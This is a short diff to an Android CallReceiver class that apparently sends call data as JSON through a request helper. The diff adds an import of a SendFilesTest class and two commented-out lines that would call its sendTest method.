@@ -15,6 +15,7 @@ import android.provider.CallLog;
 import android.telephony.TelephonyManager;
 
 import com.inet.android.request.DataRequest;
+import com.inet.android.request.SendFilesTest;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.WorkTimeDefiner;
@@ -145,5 +146,7 @@ public class CallReceiver extends BroadcastReceiver {
 
 		DataRequest dr = new DataRequest(ctx);
 		dr.sendRequest(sendJSONStr);
+//		SendFilesTest sfT = new SendFilesTest(ctx);
+//		sfT.sendTest();
 	}
 }
